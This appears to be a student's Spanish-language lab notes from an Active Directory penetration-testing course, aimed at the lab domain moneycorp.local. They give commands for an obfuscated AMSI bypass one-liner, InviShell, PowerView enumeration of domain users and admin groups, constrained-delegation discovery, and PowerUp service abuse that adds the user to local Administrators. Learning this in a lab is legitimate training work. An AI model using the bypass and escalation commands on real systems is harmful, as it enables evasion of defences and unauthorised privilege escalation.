
```ad-todo
- ¿Qué acceso tengo?
- ¿Qué puedo leer?
- ¿Qué credenciales puedo obtener?
- ¿Qué puedo controlar?
- ¿Eso me acerca al Domain Admin?
```


***InviShell***
```shell
InviShell\RunWithRegistryNonAdmin.bat
```

***AMSI Bypass***
```shell
SeT-Item ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varIABLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."AssEmbly"."GETTYPe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."getfiElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sETVaLUE"(  ${nULl},${tRuE} )
```

***PowerView***
```shell
. .\PowerView.ps1 
```

#### Quienes somos?
```shell
whoami
```

#### Pertenezco al grupo Administrators?
```shell
net localgroup Administrators
```

# Enumeración

***Listar los usuarios del dominio***
```shell
Get-DomainUser | select -ExpandProperty samaccountname
```

***Listar los nombres de equipos del dominio***
```shell
Get-DomainComputer | select -ExpandProperty dnshostname
```

***Información sobre el grupo de Domain Admins***
```shell
Get-DomainGroup -Identity "Domain Admins"
```

***Listar usuarios del grupo Domain Admins***
```shell
Get-DomainGroupMember -Identity "Domain Admins"
```

> Con esta ejecución podemos obtener los SID de los usuarios que pertenecen a este grupo
> 
> Listar los usuarios que pertenecen al grupo Enterprise Admins, se hace con el mismo comando solo que modificando el valor de Identity

El grupo de Enterprise Admins solo se encuentra en el dominio padre asi que deberemos de enumerar el grupo en el

***Listar grupo Enterprise Admins en el dominio padre***
```shell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

Encontrar archivos compartidos donde tenemos permisos de escritura
> Deberemos de crear un fichero con los servidores que se encuentran en nuestro dominio

Deberemos de importar la herramienta de *PowerHunShares*
```
```













***Constrain Delegation***
```shell
Get-NetComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto | Format-List
```

# Escalada de privilegios

Usaremos la herramienta *PowerUp*
```shell
. .\PowerUp.ps1 
```

***Encontrar servicios que nos permitan escalar privilegios***
```shell
Invoke-AllChecks 
```

> Tenemos dos tipos de servicios:
> 	- Unquoted Service Paths -> Nos permite aprovecharnos por que la ruta del servicio esta sin comillas
> 	- Modifiable Service Files -> Son servicios que pueden ser modificados, si tienen *CanRestart = True* significa que el atacante lo puede reiniciar para escalar privilegios

### Explotar servicio
Nos añadiremos al servicio que y se nos agregara el ususario al grupo Administrators
```shell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -username 'dcorp\student97'
```

Para comprobar que hemos sido añadidos usaremos
```shell
net localgroup Administrators
```

>Viendo a nuestro usuario reflejado dentro del grupo

Tendremos que hacer *LogOut* para que se apliquen los cambios



